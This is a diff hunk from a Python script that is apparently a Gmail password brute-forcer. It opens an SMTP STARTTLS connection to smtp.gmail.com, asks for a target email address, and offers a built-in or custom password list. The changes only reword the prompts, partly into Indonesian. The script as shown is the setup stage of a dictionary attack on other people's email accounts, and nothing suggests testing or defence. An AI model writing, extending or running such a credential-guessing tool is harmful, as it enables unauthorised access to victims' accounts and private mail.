@@ -32,15 +32,15 @@ smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
 smtp.ehlo()
 smtp.starttls()
 
-user = input("While The Target Gmail Adress: ")
-pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
+user = input("EMAIL TARGET: ")
+pwd = input("Enter '0' Untuk mendapatkan Password Random\nEnter '1' Untuk Membuat Password Kostum\nOptions: ")
 
 if pwd=='0':
     passswfile="passworld.txt"
 
 elif pwd=='1':
     print("\n")
-    passswfile = input("Name The File Path (For Password List):")
+    passswfile = input("Password Costum (Kostumisasi Password):")
 
 else:
     print("\n")
